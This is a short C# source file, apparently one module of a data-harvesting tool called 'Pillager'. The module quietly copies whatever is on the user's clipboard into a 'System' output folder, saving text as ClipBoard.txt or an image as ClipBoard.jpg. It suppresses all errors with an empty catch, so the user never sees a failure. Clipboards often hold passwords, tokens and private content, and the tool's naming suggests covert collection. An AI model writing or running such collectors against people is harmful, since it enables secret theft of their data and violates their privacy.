using Pillager.Helper;
using System;
using System.Collections.Generic;
using System.Drawing.Imaging;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Windows.Forms;

namespace Pillager.SystemInfos
{
    internal class ClipBoard : ICommandOnce
    {
        public override void Save(string path)
        {
            try
            {
                string savepath = Path.Combine(path, "System");
                IDataObject iData = Clipboard.GetDataObject();
                if (iData.GetDataPresent(DataFormats.Text))
                {
                    Directory.CreateDirectory(savepath);
                    File.WriteAllText(Path.Combine(savepath, "ClipBoard.txt"), (string)iData.GetData(DataFormats.Text), Encoding.UTF8);
                }
                else if (iData.GetDataPresent(DataFormats.Bitmap))
                {
                    Directory.CreateDirectory(savepath);
                    Bitmap bmp = (Bitmap)iData.GetData(DataFormats.Bitmap);
                    bmp.Save(Path.Combine(savepath, "ClipBoard.jpg"), ImageFormat.Jpeg);
                    bmp.Dispose();
                }
            }
            catch { }
        }
    }
}
